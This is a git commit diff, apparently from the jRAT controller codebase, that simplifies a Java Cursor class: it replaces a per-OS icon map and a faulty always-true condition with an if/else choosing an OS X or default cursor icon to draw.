662e3bb4d7bc6873ba40eb09f69b8a34f4fc3487
redpois0n <red@cmail.nu>
2015-03-17 19:04:09 +0100

    Cursors fixed

--- Controller/src/se/jrat/client/Cursor.java
+++ Controller/src/se/jrat/client/Cursor.java
@@ -2,34 +2,25 @@ package se.jrat.client;
 
 import java.awt.Graphics2D;
 import java.awt.Image;
-import java.util.HashMap;
-import java.util.Map;
-
-import javax.swing.ImageIcon;
 
 import se.jrat.client.utils.IconUtils;
 
 import com.redpois0n.oslib.OperatingSystem;
 
-
 public class Cursor {
-	
-	public static final Map<OperatingSystem, ImageIcon> CURSORS = new HashMap<OperatingSystem, ImageIcon>();
-	
-	static {
-		CURSORS.put(OperatingSystem.WINDOWS, IconUtils.getIcon("cursor-windows"));
-		CURSORS.put(OperatingSystem.OSX, IconUtils.getIcon("cursor-osx"));
-		CURSORS.put(null, IconUtils.getIcon("cursor"));
-	}
-	
+
 	public static void drawCursor(OperatingSystem operatingsystem, Graphics2D g, int x, int y) {
-		if (operatingsystem != OperatingSystem.WINDOWS || operatingsystem != OperatingSystem.OSX) {
-			operatingsystem = null;
+		String icon;
+
+		if (operatingsystem == OperatingSystem.OSX) {
+			icon = "cursor-osx";
+		} else {
+			icon = "cursor-default";
 		}
-		
-		drawCursor(CURSORS.get(operatingsystem).getImage(), g, x, y);
+
+		drawCursor(IconUtils.getIcon(icon).getImage(), g, x, y);
 	}
-	
+
 	public static void drawCursor(Image cursor, Graphics2D g, int x, int y) {
 		g.drawImage(cursor, x, y, null);
 	}
